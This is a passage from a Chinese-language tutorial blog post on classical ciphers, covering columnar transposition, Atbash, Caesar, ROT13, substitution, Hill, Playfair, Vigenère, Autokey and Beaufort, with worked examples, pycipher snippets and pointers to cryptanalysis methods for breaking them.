<p><img src="https://www.hackfun.org/usr/uploads/2016/07/851589488.png" alt="曲路密码路径.png"></p>
<p>密文：<code>gesfc inpho dtmwu qoury zejre hbxva lookT</code></p>
<hr>
<h4 id="3-列移位密码"><a href="#3-列移位密码" class="headerlink" title="3.列移位密码"></a>3.列移位密码</h4><p><strong>（1）介绍</strong></p>
<p>列移位密码(Columnar Transposition Cipher)是一种比较简单，易于实现的换位密码，通过一个简单的规则将明文打乱混合成密文。下面我们以明文 The quick brown fox jumps over the lazy dog，密钥 how are u为例：</p>
<p>填入5行7列表(事先约定填充的行列数，如果明文不能填充完表格可以约定使用某个字母进行填充)</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/917477580.png" alt="列移位密码.png"></p>
<p>密钥：<code>how are u</code></p>
<p>按how are u在字母表中的出现的先后顺序进行编号，我们就有a为1,e为2，h为3，o为4，r为5，u为6，w为7，所以先写出a列，其次e列，以此类推写出的结果便是密文：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/2703606324.png" alt="列移位密码示例.png"></p>
<p>密文：<code>qoury inpho Tkool hbxva uwmtd cfseg erjez</code></p>
<p>这里提供一个行列数相等的填充规则列移位密码加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/columnar-transposition/" target="_blank" rel="external">链接</a></p>
<p>另外由列移位密码变化来的密码也有其他的，比如<a href="http://www.thonky.com/kryptos/amsco-cipher" target="_blank" rel="external">Amsco密码</a>(Amsco Cipher)和<a href="http://www.thonky.com/kryptos/cadenus-cipher" target="_blank" rel="external">Cadenus密码</a>(Cadenus Cipher)。</p>
<h3 id="替换加密"><a href="#替换加密" class="headerlink" title="替换加密"></a>替换加密</h3><hr>
<h4 id="1-埃特巴什码"><a href="#1-埃特巴什码" class="headerlink" title="1.埃特巴什码"></a>1.埃特巴什码</h4><p><strong>（1）介绍</strong></p>
<p>埃特巴什码(Atbash Cipher)是一种以字母倒序排列作为特殊密钥的替换加密，也就是下面的对应关系：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ</div><div class="line">ZYXWVUTSRQPONMLKJIHGFEDCBA</div></pre></td></tr></table></figure>
<p>明文：<code>the quick brown fox jumps over the lazy dog</code></p>
<p>密文：<code>gsv jfrxp yildm ulc qfnkh levi gsv ozab wlt</code></p>
<p>加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/" target="_blank" rel="external">传送门</a></p>
<hr>
<h4 id="2-凯撒密码"><a href="#2-凯撒密码" class="headerlink" title="2.凯撒密码"></a>2.凯撒密码</h4><p><strong>（1）介绍</strong></p>
<p>凯撒密码(Caesar Cipher或称恺撒加密、恺撒变换、变换加密、位移加密)是一种替换加密，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推，更多<a href="https://en.wikipedia.org/wiki/Caesar_cipher" target="_blank" rel="external">参考</a>。</p>
<p>加密实例：</p>
<p>明文：<code>The quick brown fox jumps over the lazy dog</code></p>
<p>偏移量：1</p>
<p>密文：<code>Uif rvjdl cspxo gpy kvnqt pwfs uif mbaz eph</code></p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/193858221.png" alt="凯撒密码.png"></p>
<p>你也可以使用Python的pycipher模块来加解密，如果提示没有这个模块可以通过<code>pip install pycipher</code>或者其他方式来安装pycipher模块。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; from pycipher import Caesar</div><div class="line">&gt;&gt;&gt; Caesar(key=1).encipher(&apos;The quick brown fox jumps over the lazy dog&apos;)</div><div class="line">&apos;UIFRVJDLCSPXOGPYKVNQTPWFSUIFMBAZEPH&apos;</div><div class="line">&gt;&gt;&gt; Caesar(key=1).decipher(&apos;UIFRVJDLCSPXOGPYKVNQTPWFSUIFMBAZEPH&apos;)</div><div class="line">&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;</div></pre></td></tr></table></figure>
<p>参考表(这里是向后移位加密，向前移位解密)：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3176497054.jpg" alt="凯撒密码移位规律表.jpg"></p>
<p>加密解密<a href="http://planetcalc.com/1434/" target="_blank" rel="external">链接</a>(这个网站可以将26种情况一次性列举出来，比较方便)</p>
<hr>
<h4 id="3-ROT5-13-18-47"><a href="#3-ROT5-13-18-47" class="headerlink" title="3.ROT5/13/18/47"></a>3.ROT5/13/18/47</h4><p><strong>（1）介绍</strong></p>
<p>ROT5/13/18/47是一种简单的码元位置顺序替换暗码。此类编码具有可逆性，可以自我解密，主要用于应对快速浏览，或者是机器的读取。</p>
<blockquote>
<p>ROT5 是 rotate by 5 places 的简写，意思是旋转5个位置，其它皆同。下面分别说说它们的编码方式：</p>
<p>ROT5：只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，例如当前为0，编码后变成5，当前为1，编码后变成6，以此类推顺序循环。</p>
<p>ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环。</p>
<p>ROT18：这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，为了好称呼，将其命名为ROT18。</p>
<p>ROT47：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，例如当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_。用于ROT47编码的字符其ASCII值范围是33－126，具体可参考ASCII编码，下面以rot13以例。</p>
</blockquote>
<p>明文：<code>the quick brown fox jumps over the lazy dog</code></p>
<p>密文：<code>gur dhvpx oebja sbk whzcf bire gur ynml qbt</code></p>
<p><a href="http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php" target="_blank" rel="external">传送门</a></p>
<hr>
<h4 id="4-简单替换密码"><a href="#4-简单替换密码" class="headerlink" title="4.简单替换密码"></a>4.简单替换密码</h4><p><strong>（1）介绍</strong></p>
<p>简单换位密码(Simple Substitution Cipher)加密方式是以每个明文字母被与之唯一对应且不同的字母替换的方式实现的，它不同于恺撒密码，因为密码字母表的字母不是简单的移位，而是完全是混乱的。 比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">明文字母 : abcdefghijklmnopqrstuvwxyz</div><div class="line">明文字母 : phqgiumeaylnofdxjkrcvstzwb</div></pre></td></tr></table></figure>
<p>明文：<code>the quick brown fox jumps over the lazy dog</code></p>
<p>密文：<code>cei jvaql hkdtf udz yvoxr dsik cei npbw gdm</code></p>
<p><strong>（2）破解</strong></p>
<p>当密文数据足够多时这种密码我们可以通过字频分析方法破解或其他方法破解，比较好的在线词频分析网站<a href="http://quipqiup.com/index.php" target="_blank" rel="external">http://quipqiup.com/index.php</a>(翻= =墙)，这里推荐一篇通过”爬山算法”来破解简单替换密码<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-simple-substitution-cipher/" target="_blank" rel="external">文章</a>，基于文中的算法实现的工具来破解示例。</p>
<p>密文：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pmpafxaikkitprdsikcplifhwceigixkirradfeirdgkipgigudkcekiigpwrpucikceiginasikwduearrxiiqepcceindgmieinpwdfprduppcedoikiqiasafmfddfipfgmdafmfdteiki</div></pre></td></tr></table></figure>
<p>解密：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/1310379174.png" alt="破解简单替换密码.png"></p>
<p>(ps:score值越小越准确)</p>
<p>密钥：<code>PHQGIUMEAVLNOFDXBKRCZSTJWY</code></p>
<p>明文：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AGAINPIERREWASOVERTAKENBYTHEDEPRESSIONHESODREADEDFORTHREEDAYSAFTERTHEDELIVERYOFHISSPEECHATTHELODGEHELAYONASOFAATHOMERECEIVINGNOONEANDGOINGNOWHERE</div></pre></td></tr></table></figure>
<p>将明文转换成可读句子：</p>
<p>again pierre was over taken by the depression he so dreaded for three day safter the delivery of his speech at the lodge he lay on a  sofa at home receiving no one and going no where</p>
<hr>
<h4 id="5-希尔密码"><a href="#5-希尔密码" class="headerlink" title="5.希尔密码"></a>5.希尔密码</h4><p><strong>（1）介绍</strong></p>
<p>希尔密码(Hill Cipher)是基于线性代数多重代换密码，由Lester S. Hill在1929年发明。每个字母转换成26进制数字：A=0, B=1, C=2…Z=25一串字母当成n维向量，跟一个n×n的矩阵相乘，再将得出的结果MOD26。更多<a href="https://en.wikipedia.org/wiki/Hill_cipher" target="_blank" rel="external">参考</a></p>
<p><strong>（2）加密</strong></p>
<p>明文：<code>ACT</code></p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/372776651.png" alt="字母数字对应表.png"></p>
<p>明文对应矩阵：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/4249377796.png" alt="明文对应矩阵.png"></p>
<p>加密密钥：<code>GYBNQKURP</code></p>
<p>加密矩阵：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/288821138.png" alt="加密矩阵.png"></p>
<p>计算过程：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/215139299.png" alt="计算过程.png"></p>
<p>密文：<code>FIN</code></p>
<p><strong>（3）解密</strong></p>
<p>密文：<code>FIN</code></p>
<p>计算加密矩阵的逆矩阵：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/1240506286.png" alt="计算加密矩阵的逆矩阵.png"></p>
<p>解密计算：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3797557104.png" alt="解密计算.png"></p>
<p>明文：<code>ACT</code></p>
<p>至于证明和求逆可以参考线性代数知识。</p>
<p><strong>（4）破解</strong></p>
<p>密码分析一门破解编码和密码的艺术。当我们尝试去攻破希尔密码你会发现频率分析实际上没有什么用处，特别在密钥长度增多的情况下。对于较长的二元矩阵（2×2的希尔密码）频率分析可能可能会有帮助，但是对于较短的密文分析是没有实际作用的。</p>
<p>这里推荐一篇关于用<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-hill-cipher/" target="_blank" rel="external">已知明文样本攻击的方式破解希尔密码</a>的文章，基础的希尔密码用<a href="https://en.wikipedia.org/wiki/Known-plaintext_attack" target="_blank" rel="external">已知明文攻击</a>的方式是可攻破的，由于加密完全是线性的，所以攻击者在截取到部分明文/密文字符对可以轻松建立一个线性系统，轻松搞定希尔密码，如果不能完全确定线性系统，那么只需要添加部分明文/密文对即可。已知明文攻击时最好的方式去破解写入密码，如果明文一无所知，那就进行推测猜出部分明文。基于已知明文样本攻击的方式破解希尔密码的算法的实现工具破解示例：</p>
<p>密文：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XUKEXWSLZJUAXUNKIGWFSOZRAWURORKXAOSLHROBXBTKCMUWDVPTFBLMKEFVWMUXTVTWUIDDJVZKBRMCWOIWYDXMLUFPVSHAGSVWUFWORCWUIDUJCNVTTBERTUNOJUZHVTWKORSVRZSVVFSQXOCMUWPYTRLGBMCYPOJCLRIYTVFCCMUWUFPOXCNMCIWMSKPXEDLYIQKDJWIWCJUMVRCJUMVRKXWURKPSEEIWZVXULEIOETOOFWKBIUXPXUGOWLFPWUSCH</div></pre></td></tr></table></figure>
<p>解密：</p>
<p>解密<a href="http://bobao.360.cn/ctf/learning/136.html" target="_blank" rel="external">脚本实例</a></p>
<p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/hill-cipher/" target="_blank" rel="external">传送门</a></p>
<hr>
<h4 id="6-猪圈密码"><a href="#6-猪圈密码" class="headerlink" title="6.猪圈密码"></a>6.猪圈密码</h4><p><strong>（1）介绍</strong></p>
<p>猪圈密码(Pigpen Cipher或称九宫格密码、朱高密码、共济会密码或共济会员密码)，是一种以格子为基础的简单替代式密码。更多<a href="https://en.wikipedia.org/wiki/Pigpen_cipher" target="_blank" rel="external">参考</a></p>
<p>明文字母和对应密文：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/1221786711.jpg" alt="猪圈密码.jpg"></p>
<p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>密文：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/2324477870.png" alt="猪圈密码密文.png"></p>
<p>在线加密<a href="http://www.simonsingh.net/The_Black_Chamber/pigpen.html" target="_blank" rel="external">传送门</a></p>
<p><strong>（2）变种</strong></p>
<p>圣堂武士密码(Templar Cipher)是共济会的“猪圈密码”的一个变种，一直被共济会圣殿骑士用。</p>
<p>明文字母和对应密文：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/2277010040.png" alt="猪圈密码变种.png"></p>
<p><strong>（3）其他变种</strong></p>
<p>明文字母和对应密文：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/64095502.jpg" alt="猪圈密码变种1.jpg"></p>
<p>明文字母和对应密文：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/591779880.jpg" alt="猪圈密码变种2.jpg"></p>
<p>明文字母和对应密文：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/71234779.png" alt="猪圈密码变种3.png"></p>
<hr>
<h4 id="7-波利比奥斯方阵密码"><a href="#7-波利比奥斯方阵密码" class="headerlink" title="7.波利比奥斯方阵密码"></a>7.波利比奥斯方阵密码</h4><p><strong>（1）介绍</strong></p>
<p>波利比奥斯方阵密码（Polybius Square Cipher或称波利比奥斯棋盘）是棋盘密码的一种，是利用波利比奥斯方阵进行加密的密码方式，简单的来说就是把字母排列好，用坐标(行列)的形式表现出来。字母是密文，明文便是字母的坐标。更多<a href="https://en.wikipedia.org/wiki/Polybius_square" target="_blank" rel="external">参考</a></p>
<p>常见的排布方式：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3110003927.png" alt="波利比奥斯方阵密码.png"></p>
<p>加密实例：</p>
<p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>密文：<code>442315 4145241325 1242345233 213453 2445323543 442315 31115554 143422</code></p>
<hr>
<h4 id="8-夏多密码-曲折加密"><a href="#8-夏多密码-曲折加密" class="headerlink" title="8.夏多密码(曲折加密)"></a>8.夏多密码(曲折加密)</h4><p><strong>（1）介绍</strong></p>
<p>夏多密码是作者麦克斯韦·格兰特在中篇小说《死亡之链》塑造夏多这一英雄人物中所自创的密码，如下图所示：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3840747352.png" alt="夏多密码.png"></p>
<blockquote>
<p>注意，在以上所示的字母表密钥的底部，列有四个附加符号1，2，3，4.他们可以放在密文中的任何地方。每个附加符号指示，如何转动写有密文的纸张，再进行后续的加密或解密操作，直到出现另一个附加符号。可以把每个附加符号中的那根线看作是指示针，它指示了纸张的上端朝上，朝右，朝下，朝左。比如说：如果出现符号3，那么纸张就应该转动180度，使其上端朝下；</p>
<p>符号2表示纸张上端朝右，依次类推。</p>
</blockquote>
<p>源文本：<code>I AM IN DANGER SEND HELP(我有危险，速来增援)</code></p>
<p>密文：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/471514465.jpg" alt="夏多密码示例.jpg"></p>
<hr>
<h4 id="9-普莱菲尔密码"><a href="#9-普莱菲尔密码" class="headerlink" title="9.普莱菲尔密码"></a>9.普莱菲尔密码</h4><p>普莱菲尔密码(Playfair Cipher)是第一种用于实际的双字替换密码，用双字加密取代了简单代换密码的单字加密，很明显这样使得密文更难破译，因为使用简单替换密码的频率分析基本没有什么作用，虽然频率分析，通常仍然可以进行，但是有25×25=625种可能而不是25种可能，可以分为三个步骤，即编制密码表、整理明文、编写译文，下面我们以明文：</p>
<p><code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code>和密钥<code>CULTURE</code>为例来讲解。普莱菲尔密码又称为单方密码(Single Cipher)之后又出现它的升级版Double Playfair，也就是<a href="https://en.wikipedia.org/wiki/Two-square_cipher" target="_blank" rel="external">二方密码</a>(Two-square Cipher),在之后又有四方密码(Four-square Cipher)</p>
<p><strong>(1)编制密码表</strong></p>
<p>1.整理密钥字母<code>C U L T U R E</code>，去掉后面重复的字母得到：<code>C U L T R E</code></p>
<p>2.用上一步得到的字母自上而下来填补5乘5方表的纵列（也可横排），之后的空白按照相同的顺序用字母表中剩余的字母依次填补完整，得到如下的方格:</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/2126539796.png" alt="普莱菲尔密码.png"></p>
<blockquote>
<p>这一步需要注意的要点：整理密钥字母时，如果出现”Z”，则需要去除，因为在英文里”Z”的使用频率最低，相应的如果是德文，则需将”I”与”J”当作一个字母来看待，而法语则去掉”W”或”K”。</p>
</blockquote>
<p><strong>(2)整理明文</strong></p>
<p>我们要遵循的原则是“两个一组”，得到是若干个两两成对的字母段，用到的是明文<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code>与字母”<code>X</code>“：</p>
<p>1.将明文两两一组按顺序排开，得到：<code>TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO G</code></p>
<p>2.对于末尾的单个字母要加上一个”<code>X</code>“使之成对：<code>TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO GX</code></p>
<blockquote>
<p>这一步需要注意的要点：对于相连字母相同者，每个后面都需要加”<code>X</code>“，例如<code>TOMORROW</code>，需要写成：<code>TO MO RX RX OW</code>。</p>
</blockquote>
<p><strong>(3)编写密文</strong></p>
<p>我们要得到的密文，当然，对于每个字母对，要严格遵循如下的原则：</p>
<blockquote>
<p>1.如果两个字母在同一行则要用它右邻的字母替换，如果已在最右边，则用该行最左边的替换，如明文为”<code>CE</code>“，依据上表，应替换为”<code>EG</code>“；<br>2.如果两个字母在同一列则要用它下边的字母替换，如果已在最下边，则用该行最上边的替换，如明文为”<code>OQ</code>“，依据上表，应替换为”<code>PS</code>“；<br>3.如果两个字母在不同的行或列，则应在密码表中找两个字母使四个字母组成一个矩形，明文占据两个顶点，需用另外两个顶点的字母替换，如明文为”<code>HX</code>“，可以替换为”<code>WI/J</code>“或”<code>I/JW</code>“（下面的例子将按照横向替换原则即同行优先）。</p>
</blockquote>
<p>按照上述原则，将明文<code>TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO GX</code>加以转换得到<code>KU ND LH GT LF WU ES PW LH SI/J NP CG CR AG BU VZ QA I/JV</code>（/表示或者，不过一般用I不用J，所以分析密文时你看25个字母都有而只差一个字母没有用到可以考虑一下这种加密方式）将得到的字母改为大写并五个一组列好，得到密文<code>KUNDL HGTLF WUESP WLHSI NPCGC RAGBU VZQAI V</code>。</p>
<p>加密解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/playfair/" target="_blank" rel="external">传送门</a>(ps：这里加解密是横向编制密码表)</p>
<p>加密解密实例(ps：这里加解密也是横向编制密码表)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;from pycipher import Playfair</div><div class="line">&gt;&gt;&gt;Playfair(&apos;CULTREABDFGHIKMNOPQSVWXYZ&apos;).encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&apos;)</div><div class="line">&apos;UKDNLHTGFLWUSEPWHLISNPCGCRGAUBVZAQIV&apos;</div><div class="line">&gt;&gt;&gt;Playfair(&apos;CULTREABDFGHIKMNOPQSVWXYZ&apos;).decipher(&apos;UKDNLHTGFLWUSEPWHLISNPCGCRGAUBVZAQIV&apos;)</div><div class="line">&apos;THEQUICKBROWNFOXIUMPSOVERTHELAZYDOGX&apos;</div></pre></td></tr></table></figure>
<hr>
<h4 id="10-维吉尼亚密码"><a href="#10-维吉尼亚密码" class="headerlink" title="10.维吉尼亚密码"></a>10.维吉尼亚密码</h4><p><strong>（1）介绍</strong></p>
<p>维吉尼亚密码(Vigenère Cipher)是在单一恺撒密码的基础上扩展出多表代换密码，根据密钥(当密钥长度小于明文长度时可以循环使用)来决定用哪一行的密表来进行替换，以此来对抗字频统计，更多<a href="https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher" target="_blank" rel="external">参考</a>。</p>
<p>密表：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3162839359.png" alt="维吉尼亚密码.png"></p>
<p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>密钥(循环使用，密钥越长相对破解难度越大)：<code>CULTURE</code></p>
<p>加密过程：如果第一行为明文字母，第一列为密钥字母，那么明文字母’T’列和密钥字母’C’行的交点就是密文字母’V’，以此类推。</p>
<p>密文：<code>VBP JOZGM VCHQE JQR UNGGW QPPK NYI NUKR XFK</code></p>
<p><strong>（2）已知密钥加解密</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;from pycipher import Vigenere</div><div class="line">&gt;&gt;&gt;Vigenere(&apos;CULTURE&apos;).encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&apos;)</div><div class="line">&apos;VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK&apos;</div><div class="line">&gt;&gt;&gt;Vigenere(&apos;CULTURE&apos;).decipher(&apos;VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK&apos;)</div><div class="line">&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;</div></pre></td></tr></table></figure>
<p>在线加密解密<a href="http://planetcalc.com/2468/" target="_blank" rel="external">传送门</a></p>
<p><strong>（3）未知密钥破解</strong></p>
<p>可以参考<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher/" target="_blank" rel="external">维吉尼亚密码分析</a>这篇文章，破解维吉尼亚密码第一步是确定密钥长度，维吉尼亚密码分析这篇文章里介绍了使用<a href="https://en.wikipedia.org/wiki/Index_of_coincidence" target="_blank" rel="external">重合指数</a>算法来确定密钥长度，在确定密钥长度后就可以尝试确定密钥，通常我们可以使用<a href="https://en.wikipedia.org/wiki/Chi-squared_test" target="_blank" rel="external">卡方检验</a>来找到每个字母的偏移量，基于维吉尼亚密码分析一文中的算法实现的工具破解示例。</p>
<p>密文：<code>kiqpbkxspshwehospzqhoinlgapp</code></p>
<p>解密：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3380107861.png" alt="维吉尼亚密码破解.png"></p>
<p>(ps:结合左边的值，密钥以及解出明文可以确定kien 5或者klen 10为准确的结果)</p>
<p>明文：<code>DEFEND THE EAST WALL OF THE CASTLE</code></p>
<p><strong>（4）变种</strong></p>
<p>有几种密码和维吉尼亚密码相似，格罗斯费尔德密码(Gronsfeld cipher)实际上和维吉尼亚密码相同，除了使用了数字来代替字母以外没有什么区别。数字可以选择一种数列，如斐波那契数列，或者一些其他的伪随机序列。格罗斯费尔德密码密码分析过程和维吉尼亚密码大同小异，不过，自动密钥密码不能使用<a href="http://www.zybang.com/question/a0a1108423f63d10dbbf0c3e1bfdf3b3.html" target="_blank" rel="external">卡西斯基算法</a>(kasiski)来破译，因为自动密钥密码的密钥不重复循环使用，破译自动密钥密码最好的方法的就是从密文不断尝试和猜测其中明文或密钥的一部分。</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/863670565.png" alt="格罗斯费尔德密码.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;from pycipher import Gronsfeld</div><div class="line">&gt;&gt;&gt;Gronsfeld([2,20,11,45,20,43,4]).encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&apos;)</div><div class="line">&apos;VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK&apos;</div><div class="line">&gt;&gt;&gt;Gronsfeld([2,20,11,45,20,43,4]).decipher(&apos;VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK&apos;)</div><div class="line">&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;</div></pre></td></tr></table></figure>
<p>在线加解密<a href="http://rumkin.com/tools/cipher/gronsfeld.php" target="_blank" rel="external">传送门</a></p>
<hr>
<h4 id="11-自动密钥密码"><a href="#11-自动密钥密码" class="headerlink" title="11.自动密钥密码"></a>11.自动密钥密码</h4><p><strong>（1）介绍</strong></p>
<p>自动密钥密码(Autokey Cipher)是多表替换密码，与维吉尼亚密码密切相关，但使用不同的方法生成密钥，通常来说要比维吉尼亚密码更安全。自动密钥密码主要有两种，关键词自动密钥密码和原文自动密钥密码.下面我们以关键词自动密钥为例：</p>
<p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>关键词：<code>CULTURE</code></p>
<p>自动生成密钥：<code>CULTURE THE QUICK BROWN FOX JUMPS OVER THE</code></p>
<p>接下来的加密过程和维吉尼亚密码类似，从密表可得：</p>
<p>密文：<code>VBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK</code></p>
<p><strong>（2）已知关键词加解密</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;from pycipher import Autokey</div><div class="line">&gt;&gt;&gt;Autokey(&apos;CULTURE&apos;).encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&apos;)</div><div class="line">&apos;VBPJOZGDIVEQVHYYAIICXCSNLFWWZVDPWVK&apos;</div><div class="line">&gt;&gt;&gt;Autokey(&apos;CULTURE&apos;).decipher(&apos;VBPJOZGDIVEQVHYYAIICXCSNLFWWZVDPWVK&apos;)</div><div class="line">&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;</div></pre></td></tr></table></figure>
<p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/autokey/" target="_blank" rel="external">传送门</a></p>
<p><strong>（3）未知关键词破解</strong></p>
<p>推荐去看这篇<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/" target="_blank" rel="external">自动密钥密码分析文章</a>，基于文中的算法实现的工具来破解示例。</p>
<p>密文:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">isjiqymdebvuzrvwhmvysibugzhyinmiyeiklcvioimbninyksmmnjmgalvimlhspjxmgfiraqlhjcpvolqmnyynhpdetoxemgnoxl</div></pre></td></tr></table></figure>
<p>解密</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/4089722453.png" alt="自动密钥密码破解.png"></p>
<p>(ps:从klen 13可以看出使用的关键词为’FORTIFICATION’)</p>
<p>明文：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DESPITEBEINGMORESECURETHANTHEVIGENERECIPHERTHEAUTOKEYCIPHERISSTILLVERYEASYTOBREAKUSINGAUTOMATEDMETHODS</div></pre></td></tr></table></figure>
<p>将明文转换成可读句子：</p>
<p>despite being more secure than the vigenere cipher the autokey cipher is still very easy to break using automated methods</p>
<hr>
<h4 id="12-博福特密码"><a href="#12-博福特密码" class="headerlink" title="12.博福特密码"></a>12.博福特密码</h4><p><strong>（1）介绍</strong></p>
<p>博福特密码(Beaufort Cipher)，是一种类似于维吉尼亚密码的代换密码，由弗朗西斯·蒲福(Francis Beaufort)发明。它最知名的应用是Hagelin M-209密码机。博福特密码属于对等加密，即加密演算法与解密演算法相同。</p>
<p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>密钥(循环使用，密钥越长相对破解难度越大)：<code>CULTURE</code></p>
<p>加密过程：如果第一行为明文字母，第一列为密文字母，那么沿明文字母’T’列出现密钥字母’C’的行号就是密文字母’J’，以此类推。</p>
<p>密文：<code>JNH DAJCS TUFYE ZOX CZICM OZHC BKA RUMV RDY</code></p>
<p><strong>（2）已知密钥加解密</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;from pycipher import Beaufort</div><div class="line">&gt;&gt;&gt;Beaufort(&apos;CULTURE&apos;).encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&apos;)</div><div class="line">&apos;JNHDAJCSTUFYEZOXCZICMOZHCBKARUMVRDY&apos;</div><div class="line">&gt;&gt;&gt;Beaufort(&apos;CULTURE&apos;).decipher(&apos;JNHDAJCSTUFYEZOXCZICMOZHCBKARUMVRDY&apos;)</div><div class="line">&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;</div></pre></td></tr></table></figure>
<p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/beaufort/" target="_blank" rel="external">传送门</a></p>
<hr>
